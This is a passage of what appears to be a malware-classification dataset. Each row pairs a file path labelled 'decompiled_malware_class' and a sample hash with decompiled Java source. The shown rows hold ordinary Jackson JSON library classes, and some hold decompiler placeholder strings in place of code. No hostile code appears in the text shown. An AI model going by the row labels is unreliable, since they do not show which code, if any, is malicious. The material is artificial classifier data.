QUOTE_FIELD_NAMES(true),   QUOTE_NON_NUMERIC_NUMBERS(true),   WRITE_NUMBERS_AS_STRINGS(false);   final boolean _defaultState;   final int _mask=1 << ordinal();   public static Feature[] valuesCustom(){     Feature[] valuesCustom=values();     int length=valuesCustom.length;     Feature[] featureArr=new Feature[length];     System.arraycopy(valuesCustom,0,featureArr,0,length);     return featureArr;   }   public static int collectDefaults(){     int flags=0;     for (    Feature f : valuesCustom()) {       if (f.enabledByDefault()) {         flags|=f.getMask();       }     }     return flags;   }   Feature(  boolean defaultState){     this._defaultState=defaultState;   }   public boolean enabledByDefault(){     return this._defaultState;   }   public int getMask(){     return this._mask;   } }   public JsonGenerator configure(  Feature f,  boolean state){     if (state) {       enable(f);     }  else {       disable(f);     }     return this;   }   public void enableFeature(  Feature f){     enable(f);   }   public void disableFeature(  Feature f){     disable(f);   }   public void setFeature(  Feature f,  boolean state){     configure(f,state);   }   public boolean isFeatureEnabled(  Feature f){     return isEnabled(f);   }   public JsonGenerator setPrettyPrinter(  PrettyPrinter pp){     this._cfgPrettyPrinter=pp;     return this;   }   public void writeBinary(  byte[] data,  int offset,  int len) throws IOException, JsonGenerationException {     writeBinary(Base64Variants.getDefaultVariant(),data,offset,len);   }   public void writeBinary(  byte[] data) throws IOException, JsonGenerationException {     writeBinary(Base64Variants.getDefaultVariant(),data,0,data.length);   }   public final void writeStringField(  String fieldName,  String value) throws IOException, JsonGenerationException {     writeFieldName(fieldName);     writeString(value);   }   public final void writeBooleanField(  String fieldName,  boolean value) throws IOException, JsonGenerationException {     writeFieldName(fieldName);     writeBoolean(value);   }   public final void writeNullField(  String fieldName) throws IOException, JsonGenerationException {     writeFieldName(fieldName);     writeNull();   }   public final void writeNumberField(  String fieldName,  int value) throws IOException, JsonGenerationException {     writeFieldName(fieldName);     writeNumber(value);   }   public final void writeNumberField(  String fieldName,  long value) throws IOException, JsonGenerationException {     writeFieldName(fieldName);     writeNumber(value);   }   public final void writeNumberField(  String fieldName,  double value) throws IOException, JsonGenerationException {     writeFieldName(fieldName);     writeNumber(value);   }   public final void writeNumberField(  String fieldName,  float value) throws IOException, JsonGenerationException {     writeFieldName(fieldName);     writeNumber(value);   }   public final void writeNumberField(  String fieldName,  BigDecimal value) throws IOException, JsonGenerationException {     writeFieldName(fieldName);     writeNumber(value);   }   public final void writeBinaryField(  String fieldName,  byte[] data) throws IOException, JsonGenerationException {     writeFieldName(fieldName);     writeBinary(data);   }   public final void writeArrayFieldStart(  String fieldName) throws IOException, JsonGenerationException {     writeFieldName(fieldName);     writeStartArray();   }   public final void writeObjectFieldStart(  String fieldName) throws IOException, JsonGenerationException {     writeFieldName(fieldName);     writeStartObject();   }   public final void writeObjectField(  String fieldName,  Object pojo) throws IOException, JsonProcessingException {     writeFieldName(fieldName);     writeObject(pojo);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson\JsonLocation.code","public class JsonLocation implements Serializable {   public static final JsonLocation NA=new JsonLocation(""N/A"",-1,-1,-1,-1);   private static final long serialVersionUID=1;   final int _columnNr;   final int _lineNr;   final Object _sourceRef;   final long _totalBytes;   final long _totalChars;   public JsonLocation(  Object srcRef,  long totalChars,  int lineNr,  int colNr){     this(srcRef,-1L,totalChars,lineNr,colNr);   }   @JsonCreator public JsonLocation(  @JsonProperty(""sourceRef"") Object sourceRef,  @JsonProperty(""byteOffset"") long totalBytes,  @JsonProperty(""charOffset"") long totalChars,  @JsonProperty(""lineNr"") int lineNr,  @JsonProperty(""columnNr"") int columnNr){     this._sourceRef=sourceRef;     this._totalBytes=totalBytes;     this._totalChars=totalChars;     this._lineNr=lineNr;     this._columnNr=columnNr;   }   public Object getSourceRef(){     return this._sourceRef;   }   public int getLineNr(){     return this._lineNr;   }   public int getColumnNr(){     return this._columnNr;   }   public long getCharOffset(){     return this._totalChars;   }   public long getByteOffset(){     return this._totalBytes;   }   public String toString(){     StringBuilder sb=new StringBuilder(80);     sb.append(""[Source: "");     if (this._sourceRef == null) {       sb.append(""UNKNOWN"");     }  else {       sb.append(this._sourceRef.toString());     }     sb.append(""; line: "");     sb.append(this._lineNr);     sb.append("", column: "");     sb.append(this._columnNr);     sb.append(']');     return sb.toString();   }   public int hashCode(){     int hash=this._sourceRef == null ? 1 : this._sourceRef.hashCode();     return (((hash ^ this._lineNr) + this._columnNr) ^ ((int)this._totalChars)) + ((int)this._totalBytes);   }   public boolean equals(  Object other){     if (other == this) {       return true;     }     if (other != null && (other instanceof JsonLocation)) {       JsonLocation otherLoc=(JsonLocation)other;       if (this._sourceRef == null) {         if (otherLoc._sourceRef != null) {           return false;         }       }  else       if (!this._sourceRef.equals(otherLoc._sourceRef)) {         return false;       }       return this._lineNr == otherLoc._lineNr && this._columnNr == otherLoc._columnNr && this._totalChars == otherLoc._totalChars && getByteOffset() == otherLoc.getByteOffset();     }     return false;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson\JsonNode.code","public abstract class JsonNode implements Iterable<JsonNode> {   static final List<JsonNode> NO_NODES=Collections.emptyList();   static final List<String> NO_STRINGS=Collections.emptyList();   public abstract JsonToken asToken();   public abstract boolean equals(  Object obj);   public abstract JsonParser.NumberType getNumberType();   public abstract String getValueAsText();   public abstract JsonNode path(  int i);   public abstract JsonNode path(  String str);   public abstract String toString();   public abstract JsonParser traverse();   public abstract void writeTo(  JsonGenerator jsonGenerator) throws IOException, JsonGenerationException ;   protected JsonNode(){   }   public boolean isValueNode(){     return false;   }   public boolean isContainerNode(){     return false;   }   public boolean isMissingNode(){     return false;   }   public boolean isArray(){     return false;   }   public boolean isObject(){     return false;   }   public boolean isPojo(){     return false;   }   public boolean isNumber(){     return false;   }   public boolean isIntegralNumber(){     return false;   }   public boolean isFloatingPointNumber(){     return false;   }   public boolean isInt(){     return false;   }   public boolean isLong(){     return false;   }   public boolean isDouble(){     return false;   }   public boolean isBigDecimal(){     return false;   }   public boolean isBigInteger(){     return false;   }   public boolean isTextual(){     return false;   }   public boolean isBoolean(){     return false;   }   public boolean isNull(){     return false;   }   public boolean isBinary(){     return false;   }   public String getTextValue(){     return null;   }   public byte[] getBinaryValue() throws IOException {     return null;   }   public boolean getBooleanValue(){     return false;   }   public Number getNumberValue(){     return null;   }   public int getIntValue(){     return 0;   }   public long getLongValue(){     return 0L;   }   public double getDoubleValue(){     return 0.0d;   }   public BigDecimal getDecimalValue(){     return BigDecimal.ZERO;   }   public BigInteger getBigIntegerValue(){     return BigInteger.ZERO;   }   public JsonNode get(  int index){     return null;   }   public JsonNode get(  String fieldName){     return null;   }   @Deprecated public final JsonNode getFieldValue(  String fieldName){     return get(fieldName);   }   @Deprecated public final JsonNode getElementValue(  int index){     return get(index);   }   public int size(){     return 0;   }   @Override public final Iterator<JsonNode> iterator(){     return getElements();   }   public Iterator<JsonNode> getElements(){     return NO_NODES.iterator();   }   public Iterator<String> getFieldNames(){     return NO_STRINGS.iterator();   }   @Deprecated public final JsonNode getPath(  String fieldName){     return path(fieldName);   }   @Deprecated public final JsonNode getPath(  int index){     return path(index);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson\JsonParseException.code","public class JsonParseException extends JsonProcessingException {   static final long serialVersionUID=123;   public JsonParseException(  String msg,  JsonLocation loc){     super(msg,loc);   }   public JsonParseException(  String msg,  JsonLocation loc,  Throwable root){     super(msg,loc,root);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson\JsonParser.code","public abstract class JsonParser implements Closeable {   private static final int MAX_BYTE_I=127;   private static final int MAX_SHORT_I=32767;   private static final int MIN_BYTE_I=-128;   private static final int MIN_SHORT_I=-32768;   protected JsonToken _currToken;   protected int _features;   protected JsonToken _lastClearedToken;   public enum NumberType {  INT,   LONG,   BIG_INTEGER,   FLOAT,   DOUBLE,   BIG_DECIMAL;   public static NumberType[] valuesCustom(){     NumberType[] valuesCustom=values();     int length=valuesCustom.length;     NumberType[] numberTypeArr=new NumberType[length];     System.arraycopy(valuesCustom,0,numberTypeArr,0,length);     return numberTypeArr;   } }   @Override public abstract void close() throws IOException ;   public abstract BigInteger getBigIntegerValue() throws IOException, JsonParseException ;   public abstract byte[] getBinaryValue(  Base64Variant base64Variant) throws IOException, JsonParseException ;   public abstract ObjectCodec getCodec();   public abstract JsonLocation getCurrentLocation();   public abstract String getCurrentName() throws IOException, JsonParseException ;   public abstract BigDecimal getDecimalValue() throws IOException, JsonParseException ;   public abstract double getDoubleValue() throws IOException, JsonParseException ;   public abstract float getFloatValue() throws IOException, JsonParseException ;   public abstract int getIntValue() throws IOException, JsonParseException ;   public abstract long getLongValue() throws IOException, JsonParseException ;   public abstract NumberType getNumberType() throws IOException, JsonParseException ;   public abstract Number getNumberValue() throws IOException, JsonParseException ;   public abstract JsonStreamContext getParsingContext();   public abstract String getText() throws IOException, JsonParseException ;   public abstract char[] getTextCharacters() throws IOException, JsonParseException ;   public abstract int getTextLength() throws IOException, JsonParseException ;   public abstract int getTextOffset() throws IOException, JsonParseException ;   public abstract JsonLocation getTokenLocation();   public abstract boolean isClosed();   public abstract JsonToken nextToken() throws IOException, JsonParseException ;   public abstract void setCodec(  ObjectCodec objectCodec);   public abstract JsonParser skipChildren() throws IOException, JsonParseException ;   public enum Feature {  AUTO_CLOSE_SOURCE(true),   ALLOW_COMMENTS(false),   ALLOW_UNQUOTED_FIELD_NAMES(false),   ALLOW_SINGLE_QUOTES(false),   ALLOW_UNQUOTED_CONTROL_CHARS(false),   INTERN_FIELD_NAMES(true),   CANONICALIZE_FIELD_NAMES(true);   final boolean _defaultState;   public static Feature[] valuesCustom(){     Feature[] valuesCustom=values();     int length=valuesCustom.length;     Feature[] featureArr=new Feature[length];     System.arraycopy(valuesCustom,0,featureArr,0,length);     return featureArr;   }   public static int collectDefaults(){     int flags=0;     for (    Feature f : valuesCustom()) {       if (f.enabledByDefault()) {         flags|=f.getMask();       }     }     return flags;   }   Feature(  boolean defaultState){     this._defaultState=defaultState;   }   public boolean enabledByDefault(){     return this._defaultState;   }   public boolean enabledIn(  int flags){     return (getMask() & flags) != 0;   }   public int getMask(){     return 1 << ordinal();   } }   public JsonParser enable(  Feature f){     this._features|=f.getMask();     return this;   }   public JsonParser disable(  Feature f){     this._features&=f.getMask() ^ (-1);     return this;   }   public JsonParser configure(  Feature f,  boolean state){     if (state) {       enableFeature(f);     }  else {       disableFeature(f);     }     return this;   }   public boolean isEnabled(  Feature f){     return (this._features & f.getMask()) != 0;   }   public void setFeature(  Feature f,  boolean state){     configure(f,state);   }   public void enableFeature(  Feature f){     enable(f);   }   public void disableFeature(  Feature f){     disable(f);   }   public final boolean isFeatureEnabled(  Feature f){     return isEnabled(f);   }   public JsonToken nextValue() throws IOException, JsonParseException {     JsonToken t=nextToken();     if (t == JsonToken.FIELD_NAME) {       return nextToken();     }     return t;   }   public JsonToken getCurrentToken(){     return this._currToken;   }   public boolean hasCurrentToken(){     return this._currToken != null;   }   public void clearCurrentToken(){     if (this._currToken != null) {       this._lastClearedToken=this._currToken;       this._currToken=null;     }   }   public JsonToken getLastClearedToken(){     return this._lastClearedToken;   }   public byte getByteValue() throws IOException, JsonParseException {     int value=getIntValue();     if (value < MIN_BYTE_I || value > MAX_BYTE_I) {       throw _constructError(""Numeric value ("" + getText() + "") out of range of Java byte"");     }     return (byte)value;   }   public short getShortValue() throws IOException, JsonParseException {     int value=getIntValue();     if (value < MIN_SHORT_I || value > MAX_SHORT_I) {       throw _constructError(""Numeric value ("" + getText() + "") out of range of Java short"");     }     return (short)value;   }   public boolean getBooleanValue() throws IOException, JsonParseException {     if (this._currToken == JsonToken.VALUE_TRUE) {       return true;     }     if (this._currToken == JsonToken.VALUE_FALSE) {       return false;     }     throw new JsonParseException(""Current token ("" + this._currToken + "") not of boolean type"",getCurrentLocation());   }   public Object getEmbeddedObject() throws IOException, JsonParseException {     return null;   }   public byte[] getBinaryValue() throws IOException, JsonParseException {     return getBinaryValue(Base64Variants.getDefaultVariant());   }   public <T>T readValueAs(  Class<T> cls) throws IOException, JsonProcessingException {     ObjectCodec codec=getCodec();     if (codec == null) {       throw new IllegalStateException(""No ObjectCodec defined for the parser, can not deserialize JSON into Java objects"");     }     return (T)codec.readValue(this,cls);   }   public <T>T readValueAs(  TypeReference<?> typeReference) throws IOException, JsonProcessingException {     ObjectCodec codec=getCodec();     if (codec == null) {       throw new IllegalStateException(""No ObjectCodec defined for the parser, can not deserialize JSON into Java objects"");     }     return (T)codec.readValue(this,typeReference);   }   public JsonNode readValueAsTree() throws IOException, JsonProcessingException {     ObjectCodec codec=getCodec();     if (codec == null) {       throw new IllegalStateException(""No ObjectCodec defined for the parser, can not deserialize JSON into JsonNode tree"");     }     return codec.readTree(this);   }   public JsonParseException _constructError(  String msg){     return new JsonParseException(msg,getCurrentLocation());   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson\JsonProcessingException.code","public class JsonProcessingException extends IOException {   static final long serialVersionUID=123;   protected JsonLocation mLocation;   public JsonProcessingException(  String msg,  JsonLocation loc,  Throwable rootCause){     super(msg);     if (rootCause != null) {       initCause(rootCause);     }     this.mLocation=loc;   }   protected JsonProcessingException(  String msg){     super(msg);   }   public JsonProcessingException(  String msg,  JsonLocation loc){     this(msg,loc,null);   }   protected JsonProcessingException(  String msg,  Throwable rootCause){     this(msg,null,rootCause);   }   public JsonProcessingException(  Throwable rootCause){     this(null,null,rootCause);   }   public JsonLocation getLocation(){     return this.mLocation;   }   @Override public String getMessage(){     String msg=super.getMessage();     if (msg == null) {       msg=""N/A"";     }     JsonLocation loc=getLocation();     if (loc == null) {       return msg;     }     return msg + ""\n at "" + loc.toString();   }   @Override public String toString(){     return String.valueOf(getClass().getName()) + "": "" + getMessage();   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson\JsonStreamContext.code","!org.eclipse.jdt.core.dom.TypeDeclaration@37effaa5"
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson\ObjectCodec.code","public abstract class ObjectCodec {   public abstract JsonNode createArrayNode();   public abstract JsonNode createObjectNode();   public abstract JsonNode readTree(  JsonParser jsonParser) throws IOException, JsonProcessingException ;   public abstract <T>T readValue(  JsonParser jsonParser,  Class<T> cls) throws IOException, JsonProcessingException ;   public abstract <T>T readValue(  JsonParser jsonParser,  JavaType javaType) throws IOException, JsonProcessingException ;   public abstract <T>T readValue(  JsonParser jsonParser,  TypeReference<?> typeReference) throws IOException, JsonProcessingException ;   public abstract JsonParser treeAsTokens(  JsonNode jsonNode);   public abstract <T>T treeToValue(  JsonNode jsonNode,  Class<T> cls) throws IOException, JsonProcessingException ;   public abstract void writeTree(  JsonGenerator jsonGenerator,  JsonNode jsonNode) throws IOException, JsonProcessingException ;   public abstract void writeValue(  JsonGenerator jsonGenerator,  Object obj) throws IOException, JsonProcessingException ;   protected ObjectCodec(){   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson\PrettyPrinter.code","public interface PrettyPrinter {   void beforeArrayValues(  JsonGenerator jsonGenerator) throws IOException, JsonGenerationException ;   void beforeObjectEntries(  JsonGenerator jsonGenerator) throws IOException, JsonGenerationException ;   void writeArrayValueSeparator(  JsonGenerator jsonGenerator) throws IOException, JsonGenerationException ;   void writeEndArray(  JsonGenerator jsonGenerator,  int i) throws IOException, JsonGenerationException ;   void writeEndObject(  JsonGenerator jsonGenerator,  int i) throws IOException, JsonGenerationException ;   void writeObjectEntrySeparator(  JsonGenerator jsonGenerator) throws IOException, JsonGenerationException ;   void writeObjectFieldValueSeparator(  JsonGenerator jsonGenerator) throws IOException, JsonGenerationException ;   void writeRootValueSeparator(  JsonGenerator jsonGenerator) throws IOException, JsonGenerationException ;   void writeStartArray(  JsonGenerator jsonGenerator) throws IOException, JsonGenerationException ;   void writeStartObject(  JsonGenerator jsonGenerator) throws IOException, JsonGenerationException ; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.impl\ArrayWContext.code","final class ArrayWContext extends JsonWriteContext {   public ArrayWContext(  JsonWriteContext parent){     super(1,parent);   }   @Override public String getCurrentName(){     return null;   }   @Override public int writeFieldName(  String name){     return 4;   }   @Override public int writeValue(){     int ix=this._index;     this._index++;     return ix < 0 ? 0 : 1;   }   @Override protected void appendDesc(  StringBuilder sb){     sb.append('[');     sb.append(getCurrentIndex());     sb.append(']');   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.impl\ByteSourceBootstrapper.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6c2112e1"
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.impl\DefaultPrettyPrinter.code","public class DefaultPrettyPrinter implements PrettyPrinter {   protected Indenter _arrayIndenter=new FixedSpaceIndenter();   protected Indenter _objectIndenter=new Lf2SpacesIndenter();   protected boolean _spacesInObjectEntries=true;   protected int _nesting=0;   public void indentArraysWith(  Indenter i){     this._arrayIndenter=i == null ? new NopIndenter() : i;   }   public void indentObjectsWith(  Indenter i){     this._objectIndenter=i == null ? new NopIndenter() : i;   }   public void spacesInObjectEntries(  boolean b){     this._spacesInObjectEntries=b;   }   @Override public void writeRootValueSeparator(  JsonGenerator jg) throws IOException, JsonGenerationException {     jg.writeRaw(' ');   }   @Override public void writeStartObject(  JsonGenerator jg) throws IOException, JsonGenerationException {     jg.writeRaw('{');     if (!this._objectIndenter.isInline()) {       this._nesting++;     }   }   @Override public void beforeObjectEntries(  JsonGenerator jg) throws IOException, JsonGenerationException {     this._objectIndenter.writeIndentation(jg,this._nesting);   }   @Override public void writeObjectFieldValueSeparator(  JsonGenerator jg) throws IOException, JsonGenerationException {     if (this._spacesInObjectEntries) {       jg.writeRaw("" : "");     }  else {       jg.writeRaw(':');     }   }   @Override public void writeObjectEntrySeparator(  JsonGenerator jg) throws IOException, JsonGenerationException {     jg.writeRaw(',');     this._objectIndenter.writeIndentation(jg,this._nesting);   }   @Override public void writeEndObject(  JsonGenerator jg,  int nrOfEntries) throws IOException, JsonGenerationException {     if (!this._objectIndenter.isInline()) {       this._nesting--;     }     if (nrOfEntries > 0) {       this._objectIndenter.writeIndentation(jg,this._nesting);     }  else {       jg.writeRaw(' ');     }     jg.writeRaw('}');   }   @Override public void writeStartArray(  JsonGenerator jg) throws IOException, JsonGenerationException {     if (!this._arrayIndenter.isInline()) {       this._nesting++;     }     jg.writeRaw('[');   }   @Override public void beforeArrayValues(  JsonGenerator jg) throws IOException, JsonGenerationException {     this._arrayIndenter.writeIndentation(jg,this._nesting);   }   @Override public void writeArrayValueSeparator(  JsonGenerator jg) throws IOException, JsonGenerationException {     jg.writeRaw(',');     this._arrayIndenter.writeIndentation(jg,this._nesting);   }   @Override public void writeEndArray(  JsonGenerator jg,  int nrOfValues) throws IOException, JsonGenerationException {     if (!this._arrayIndenter.isInline()) {       this._nesting--;     }     if (nrOfValues > 0) {       this._arrayIndenter.writeIndentation(jg,this._nesting);     }  else {       jg.writeRaw(' ');     }     jg.writeRaw(']');   } public static class NopIndenter implements Indenter {     @Override public void writeIndentation(    JsonGenerator jg,    int level){     }     @Override public boolean isInline(){       return true;     }   } public static class FixedSpaceIndenter implements Indenter {     @Override public void writeIndentation(    JsonGenerator jg,    int level) throws IOException, JsonGenerationException {       jg.writeRaw(' ');     }     @Override public boolean isInline(){       return true;     }   } public static class Lf2SpacesIndenter implements Indenter {     static final char[] SPACES;     static final int SPACE_COUNT=64;     static final String SYSTEM_LINE_SEPARATOR; static {       String lf=null;       try {         lf=System.getProperty(""line.separator"");       }  catch (      Throwable th) {       }       SYSTEM_LINE_SEPARATOR=lf == null ? ""\n"" : lf;       SPACES=new char[64];       Arrays.fill(SPACES,' ');     }     @Override public boolean isInline(){       return false;     }     @Override public void writeIndentation(    JsonGenerator jg,    int level) throws IOException, JsonGenerationException {       jg.writeRaw(SYSTEM_LINE_SEPARATOR);       int level2=level + level;       while (level2 > 64) {         jg.writeRaw(SPACES,0,64);         level2-=SPACES.length;       }       jg.writeRaw(SPACES,0,level2);     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.impl\FixedSpaceIndenter.code","public static class FixedSpaceIndenter implements Indenter {   @Override public void writeIndentation(  JsonGenerator jg,  int level) throws IOException, JsonGenerationException {     jg.writeRaw(' ');   }   @Override public boolean isInline(){     return true;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.impl\Indenter.code","public interface Indenter {   boolean isInline();   void writeIndentation(  JsonGenerator jsonGenerator,  int i) throws IOException, JsonGenerationException ; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.impl\JsonGeneratorBase.code","!org.eclipse.jdt.core.dom.TypeDeclaration@324535e4"
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.impl\JsonNumericParserBase.code","public abstract class JsonNumericParserBase extends JsonParserBase {   protected static final char CHAR_NULL=0;   protected static final int INT_0=48;   protected static final int INT_1=49;   protected static final int INT_2=50;   protected static final int INT_3=51;   protected static final int INT_4=52;   protected static final int INT_5=53;   protected static final int INT_6=54;   protected static final int INT_7=55;   protected static final int INT_8=56;   protected static final int INT_9=57;   protected static final int INT_DECIMAL_POINT=46;   protected static final int INT_E=69;   protected static final int INT_MINUS=45;   protected static final int INT_PLUS=43;   protected static final int INT_e=101;   static final double MAX_INT_D=2.147483647E9d;   static final long MAX_INT_L=2147483647L;   static final double MAX_LONG_D=9.223372036854776E18d;   static final double MIN_INT_D=-2.147483648E9d;   static final long MIN_INT_L=-2147483648L;   static final double MIN_LONG_D=-9.223372036854776E18d;   protected static final int NR_BIGDECIMAL=16;   protected static final int NR_BIGINT=4;   protected static final int NR_DOUBLE=8;   protected static final int NR_INT=1;   protected static final int NR_LONG=2;   protected static final int NR_UNKNOWN=0;   protected int _numTypesValid;   protected BigDecimal _numberBigDecimal;   protected BigInteger _numberBigInt;   protected double _numberDouble;   protected int _numberInt;   protected long _numberLong;   protected boolean _numberNegative;   protected int mExpLength;   protected int mFractLength;   protected int mIntLength;   static final BigDecimal BD_MIN_LONG=new BigDecimal(Long.MIN_VALUE);   static final BigDecimal BD_MAX_LONG=new BigDecimal(Long.MAX_VALUE);   static final BigDecimal BD_MIN_INT=new BigDecimal(Long.MIN_VALUE);   static final BigDecimal BD_MAX_INT=new BigDecimal(Long.MAX_VALUE);   protected abstract JsonToken parseNumberText(  int i) throws IOException, JsonParseException ;   public JsonNumericParserBase(  IOContext ctxt,  int features){     super(ctxt,features);     this._numTypesValid=0;   }   public final JsonToken reset(  boolean negative,  int intLen,  int fractLen,  int expLen){     this._numberNegative=negative;     this.mIntLength=intLen;     this.mFractLength=fractLen;     this.mExpLength=expLen;     this._numTypesValid=0;     return (fractLen >= 1 || expLen >= 1) ? JsonToken.VALUE_NUMBER_FLOAT : JsonToken.VALUE_NUMBER_INT;   }   @Override public Number getNumberValue() throws IOException, JsonParseException {     if (this._numTypesValid == 0) {       parseNumericValue(0);     }     if (this._currToken == JsonToken.VALUE_NUMBER_INT) {       if ((this._numTypesValid & 1) != 0) {         return Integer.valueOf(this._numberInt);       }       if ((this._numTypesValid & 2) != 0) {         return Long.valueOf(this._numberLong);       }       if ((this._numTypesValid & 4) != 0) {         return this._numberBigInt;       }       return this._numberBigDecimal;     }     if ((this._numTypesValid & 16) != 0) {       return this._numberBigDecimal;     }     if ((this._numTypesValid & 8) == 0) {       _throwInternal();     }     return Double.valueOf(this._numberDouble);   }   @Override public JsonParser.NumberType getNumberType() throws IOException, JsonParseException {     if (this._numTypesValid == 0) {       parseNumericValue(0);     }     if (this._currToken == JsonToken.VALUE_NUMBER_INT) {       if ((this._numTypesValid & 1) != 0) {         return JsonParser.NumberType.INT;       }       if ((this._numTypesValid & 2) != 0) {         return JsonParser.NumberType.LONG;       }       return JsonParser.NumberType.BIG_INTEGER;     }     if ((this._numTypesValid & 16) != 0) {       return JsonParser.NumberType.BIG_DECIMAL;     }     return JsonParser.NumberType.DOUBLE;   }   @Override public int getIntValue() throws IOException, JsonParseException {     if ((this._numTypesValid & 1) == 0) {       if (this._numTypesValid == 0) {         parseNumericValue(1);       }       if ((this._numTypesValid & 1) == 0) {         convertNumberToInt();       }     }     return this._numberInt;   }   @Override public long getLongValue() throws IOException, JsonParseException {     if ((this._numTypesValid & 2) == 0) {       if (this._numTypesValid == 0) {         parseNumericValue(2);       }       if ((this._numTypesValid & 2) == 0) {         convertNumberToLong();       }     }     return this._numberLong;   }   @Override public BigInteger getBigIntegerValue() throws IOException, JsonParseException {     if ((this._numTypesValid & 4) == 0) {       if (this._numTypesValid == 0) {         parseNumericValue(4);       }       if ((this._numTypesValid & 4) == 0) {         convertNumberToBigInteger();       }     }     return this._numberBigInt;   }   @Override public float getFloatValue() throws IOException, JsonParseException {     double value=getDoubleValue();     return (float)value;   }   @Override public double getDoubleValue() throws IOException, JsonParseException {     if ((this._numTypesValid & 8) == 0) {       if (this._numTypesValid == 0) {         parseNumericValue(8);       }       if ((this._numTypesValid & 8) == 0) {         convertNumberToDouble();       }     }     return this._numberDouble;   }   @Override public BigDecimal getDecimalValue() throws IOException, JsonParseException {     if ((this._numTypesValid & 16) == 0) {       if (this._numTypesValid == 0) {         parseNumericValue(16);       }       if ((this._numTypesValid & 16) == 0) {         convertNumberToBigDecimal();       }     }     return this._numberBigDecimal;   }   protected final void parseNumericValue(  int expType) throws JsonParseException {     if (this._currToken == null || !this._currToken.isNumeric()) {       _reportError(""Current token ("" + this._currToken + "") not numeric, can not use numeric value accessors"");     }     try {       if (this._currToken == JsonToken.VALUE_NUMBER_INT) {         char[] buf=this._textBuffer.getTextBuffer();         int offset=this._textBuffer.getTextOffset();         int len=this.mIntLength;         if (this._numberNegative) {           offset++;         }         if (len <= 9) {           int i=NumberInput.parseInt(buf,offset,len);           this._numberInt=this._numberNegative ? -i : i;           this._numTypesValid=1;           return;         }         if (len <= 18) {           long l=NumberInput.parseLong(buf,offset,len);           if (this._numberNegative) {             l=-l;           }           if (len == 10) {             if (this._numberNegative) {               if (l >= MIN_INT_L) {                 this._numberInt=(int)l;                 this._numTypesValid=1;                 return;               }             }  else             if (l <= MAX_INT_L) {               this._numberInt=(int)l;               this._numTypesValid=1;               return;             }           }           this._numberLong=l;           this._numTypesValid=2;           return;         }         String numStr=this._textBuffer.contentsAsString();         if (NumberInput.inLongRange(buf,offset,len,this._numberNegative)) {           this._numberLong=Long.parseLong(numStr);           this._numTypesValid=2;           return;         }  else {           this._numberBigInt=new BigInteger(numStr);           this._numTypesValid=4;           return;         }       }       if (expType == 16) {         this._numberBigDecimal=this._textBuffer.contentsAsDecimal();         this._numTypesValid=16;       }  else {         this._numberDouble=this._textBuffer.contentsAsDouble();         this._numTypesValid=8;       }     }  catch (    NumberFormatException nex) {       _wrapError(""Malformed numeric value '"" + this._textBuffer.contentsAsString() + ""'"",nex);     }   }   protected void convertNumberToInt() throws IOException, JsonParseException {     if ((this._numTypesValid & 2) != 0) {       int result=(int)this._numberLong;       if (result != this._numberLong) {         _reportError(""Numeric value ("" + getText() + "") out of range of int"");       }       this._numberInt=result;     }  else     if ((this._numTypesValid & 4) != 0) {       this._numberInt=this._numberBigInt.intValue();     }  else     if ((this._numTypesValid & 8) != 0) {       if (this._numberDouble < MIN_INT_D || this._numberDouble > MAX_INT_D) {         reportOverflowInt();       }       this._numberInt=(int)this._numberDouble;     }  else     if ((this._numTypesValid & 16) != 0) {       if (BD_MIN_INT.compareTo(this._numberBigDecimal) > 0 || BD_MAX_INT.compareTo(this._numberBigDecimal) < 0) {         reportOverflowInt();       }       this._numberInt=this._numberBigDecimal.intValue();     }  else {       _throwInternal();     }     this._numTypesValid|=1;   }   protected void convertNumberToLong() throws IOException, JsonParseException {     if ((this._numTypesValid & 1) != 0) {       this._numberLong=this._numberInt;     }  else     if ((this._numTypesValid & 4) != 0) {       this._numberLong=this._numberBigInt.longValue();     }  else     if ((this._numTypesValid & 8) != 0) {       if (this._numberDouble < MIN_LONG_D || this._numberDouble > MAX_LONG_D) {         reportOverflowLong();       }       this._numberLong=(long)this._numberDouble;     }  else     if ((this._numTypesValid & 16) != 0) {       if (BD_MIN_LONG.compareTo(this._numberBigDecimal) > 0 || BD_MAX_LONG.compareTo(this._numberBigDecimal) < 0) {         reportOverflowLong();       }       this._numberLong=this._numberBigDecimal.longValue();     }  else {       _throwInternal();     }     this._numTypesValid|=2;   }   protected void convertNumberToBigInteger() throws IOException, JsonParseException {     if ((this._numTypesValid & 16) != 0) {       this._numberBigInt=this._numberBigDecimal.toBigInteger();     }  else     if ((this._numTypesValid & 